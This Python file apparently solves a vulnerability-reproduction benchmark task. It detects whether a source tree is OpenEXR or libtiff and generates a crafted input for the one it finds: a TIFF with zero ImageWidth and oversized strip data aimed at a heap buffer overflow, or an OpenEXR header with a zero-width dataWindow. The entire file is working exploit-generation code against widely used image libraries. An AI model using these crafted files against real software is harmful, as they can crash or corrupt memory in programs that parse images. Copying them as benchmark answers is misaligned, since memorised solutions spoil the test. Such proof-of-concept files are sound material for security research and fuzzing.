import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        is_openexr = False
        
        # Heuristic detection of the target library
        path_lower = src_path.lower()
        if "openexr" in path_lower:
            is_openexr = True
        elif "tiff" in path_lower:
            is_openexr = False
        elif os.path.isdir(src_path):
            for root, dirs, files in os.walk(src_path):
                if "openexr" in root.lower():
                    is_openexr = True
                    break
                for f in files:
                    if "ImfHeader.h" in f or "OpenEXR" in f:
                        is_openexr = True
                        break
                if is_openexr:
                    break
        
        if is_openexr:
            return self.generate_exr()
        else:
            return self.generate_tiff()

    def generate_tiff(self) -> bytes:
        # Create a Malformed TIFF with ImageWidth = 0 to trigger Heap Buffer Overflow
        # Header: Little Endian, Magic 42, Offset 8
        poc = struct.pack('<2sHI', b'II', 42, 8)
        
        # IFD Tags
        # 256 ImageWidth: 0 (The Trigger)
        # 257 ImageLength: 10
        # 258 BitsPerSample: 8
        # 259 Compression: 1 (None)
        # 262 PhotometricInterpretation: 1 (BlackIsZero)
        # 273 StripOffsets: 120 (Points to data after IFD)
        # 278 RowsPerStrip: 10
        # 279 StripByteCounts: 1024 (Large enough to overflow if buffer is allocated based on width=0)
        
        tags = [
            (256, 4, 1, 0),       # ImageWidth
            (257, 4, 1, 10),      # ImageLength
            (258, 3, 1, 8),       # BitsPerSample
            (259, 3, 1, 1),       # Compression
            (262, 3, 1, 1),       # PhotometricInterpretation
            (273, 4, 1, 120),     # StripOffsets
            (278, 4, 1, 10),      # RowsPerStrip
            (279, 4, 1, 1024),    # StripByteCounts
        ]
        
        tags.sort(key=lambda x: x[0])
        
        # Pack IFD
        ifd = struct.pack('<H', len(tags))
        for t in tags:
            # Tag, Type, Count, Value
            ifd += struct.pack('<HHII', t[0], t[1], t[2], t[3])
        ifd += struct.pack('<I', 0) # Next IFD Offset
        
        poc += ifd
        
        # Padding to reach StripOffsets (120)
        if len(poc) < 120:
            poc += b'\x00' * (120 - len(poc))
            
        # Payload Data
        poc += b'A' * 2048 
        
        return poc

    def generate_exr(self) -> bytes:
        # Create a Malformed OpenEXR with Zero Width (dataWindow)
        # Magic: 76 2f 31 01
        poc = b'\x76\x2f\x31\x01'
        # Version 2, flags 0
        poc += b'\x02\x00\x00\x00'
        
        def pack_attr(name, type_, value):
            return (name.encode('ascii') + b'\x00' + 
                    type_.encode('ascii') + b'\x00' + 
                    struct.pack('<I', len(value)) + value)

        # channels: "R", int(1), linear(0), reserved, xSamp(1), ySamp(1)
        ch_data = b'R\x00' + struct.pack('<i', 1) + b'\x00\x00\x00\x00' + struct.pack('<ii', 1, 1) + b'\x00'
        poc += pack_attr('channels', 'chlist', ch_data)
        
        poc += pack_attr('compression', 'compression', b'\x00')
        
        # dataWindow: xMin=0, yMin=0, xMax=-1, yMax=0 -> Width = 0
        poc += pack_attr('dataWindow', 'box2i', struct.pack('<iiii', 0, 0, -1, 0))
        
        # displayWindow
        poc += pack_attr('displayWindow', 'box2i', struct.pack('<iiii', 0, 0, 0, 0))
        
        poc += pack_attr('lineOrder', 'lineOrder', b'\x00')
        poc += pack_attr('pixelAspectRatio', 'float', struct.pack('<f', 1.0))
        poc += pack_attr('screenWindowCenter', 'v2f', struct.pack('<ff', 0.0, 0.0))
        poc += pack_attr('screenWindowWidth', 'float', struct.pack('<f', 1.0))
        
        # End of header
        poc += b'\x00'
        
        # Arbitrary data to allow parsing to proceed
        poc += b'\x00' * 1024
        
        return poc